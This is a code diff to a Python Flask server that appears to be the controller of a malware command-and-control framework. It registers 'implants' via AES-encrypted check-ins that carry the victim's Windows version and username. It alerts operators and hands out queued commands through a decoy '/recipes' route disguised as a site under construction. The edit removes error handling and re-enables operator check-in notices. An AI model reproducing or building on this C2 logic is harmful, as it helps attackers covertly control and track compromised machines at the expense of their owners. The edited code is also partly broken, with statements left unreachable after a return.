@@ -77,48 +77,48 @@ def under_construction():
 # The login route for implants
 @app.route("/login", methods=['POST'])
 def implant_register():
-    try:
-        # Read in Base64 post data
-        aes_data = request.get_data()
+    #try:
+    # Read in Base64 post data
+    aes_data = request.get_data()
 
-        # Decrypt it
-        data = AES_INSTANCE.decrypt(aes_data)
-        
-        # Extract the major windows version and the build number
-        major_v = data.split(":::")[0]
-        build_num = data.split(":::")[1]
-        sleep_time = data.split(":::")[2]
-        user = data.split(":::")[3]
+    # Decrypt it
+    data = AES_INSTANCE.decrypt(aes_data)
+    
+    # Extract the major windows version and the build number
+    major_v = data.split(":::")[0]
+    build_num = data.split(":::")[1]
+    sleep_time = data.split(":::")[2]
+    user = data.split(":::")[3]
 
-        # Generate a name
-        new_implant_name = encryption.id_generator(N=4)
-        # Print for debug
-        print(new_implant_name)
-        print(data)
+    # Generate a name
+    new_implant_name = encryption.id_generator(N=4)
+    # Print for debug
+    print(new_implant_name)
+    print(data)
 
-        # Add the new implant to the implant_db
-        implant_db.add_implant(storage.Implant(name=new_implant_name,
-                                               major_v=major_v,
-                                               build_num=build_num,
-                                               sleep_time=sleep_time,
-                                               IP=request.remote_addr,
-                                               user=user
-                                              ))
+    # Add the new implant to the implant_db
+    implant_db.add_implant(storage.Implant(name=new_implant_name,
+                                           major_v=major_v,
+                                           build_num=build_num,
+                                           sleep_time=sleep_time,
+                                           IP=request.remote_addr,
+                                           user=user
+                                          ))
 
-        # Update the operators
-        update_operators(server_codes.ServerUpdates.NEW_IMPLANT, implant_db.dict[new_implant_name])
-        print(f"A new implant has connected: {new_implant_name}")
+    # Update the operators
+    update_operators(server_codes.ServerUpdates.NEW_IMPLANT, implant_db.dict[new_implant_name])
+    print(f"A new implant has connected: {new_implant_name}")
 
-        # Set the first contact time
-        implant_db.dict[new_implant_name].last_checkin = datetime.now()
+    # Set the first contact time
+    implant_db.dict[new_implant_name].last_checkin = datetime.now()
 
-        # Respond with the new name as a Cookie header and random text
-        response = make_response(encryption.id_generator(random.randint(200,350)))
-        response.headers["Cookie"] = new_implant_name
-        return response
-    except:
-        print("An implant tried to log in but the /login endpoint error'ed")
-        return server_codes.ServerErrors.ERR_IMPLANT_LOGIN_EXCEPTION.value
+    # Respond with the new name as a Cookie header and random text
+    response = make_response(encryption.id_generator(random.randint(200,350)))
+    response.headers["Cookie"] = new_implant_name
+    return response
+    #except:
+    print("An implant tried to log in but the /login endpoint error'ed")
+    return server_codes.ServerErrors.ERR_IMPLANT_LOGIN_EXCEPTION.value
 
 # The command recieve route for implants
 @app.route("/recipes")
@@ -130,7 +130,7 @@ def implant_command():
         return "Site is under construction"
 
     # Update the operators
-    #update_operators(server_codes.ServerUpdates.IMPLANT_CHECKIN,implant_name)
+    update_operators(server_codes.ServerUpdates.IMPLANT_CHECKIN,implant_name)
     
     if len(implant_db.dict[implant_name].command_queue) > 0:
         new_cmd = implant_db.dict[implant_name].pop_command()
